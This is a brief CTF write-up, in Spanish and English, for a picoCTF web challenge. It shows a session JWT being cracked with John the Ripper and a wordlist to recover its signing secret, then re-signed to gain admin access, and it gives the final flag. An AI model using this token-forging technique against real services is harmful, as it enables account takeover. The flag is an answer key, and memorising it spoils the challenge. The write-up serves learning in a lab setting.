## Objetivo 
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/63090/` or http://jupiter.challenges.picoctf.org:63090
## Solución  
```bash
kali@KaliEND:~/Downloads$ nano hash  
kali@KaliEND:~/Downloads$ cat hash  
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZXJpYyJ9.UfDYxXAeMS7_v7QmUnlsvw2FCQQb7aT4bY8MeOH_zNs  
kali@KaliEND:~/Downloads$ john hash -w rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:00 DONE (2024-09-24 23:53) 1.111g/s 8219Kp/s 8219Kc/s 8219KC/s iloveyokaos..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
## Notas Adicionales 
usamos cookie editor para acceder a la cookie, posteriormente usamos jwt para obtener los datos del token y poder modificarlos, y despues de poder obtener la firma mediante un ataque de diccionario mediante john reaper y al obtener el signature que es `ilovepico` y tambien camiarla en https://jwt.io/ 
al cambiar la cookie nuevamente y recargar obtenemos la flag:
picoCTF{jawt_was_just_what_you_thought_f859ab2f}

### Referencias
Encoded to Decoded JWT Token
https://jwt.io/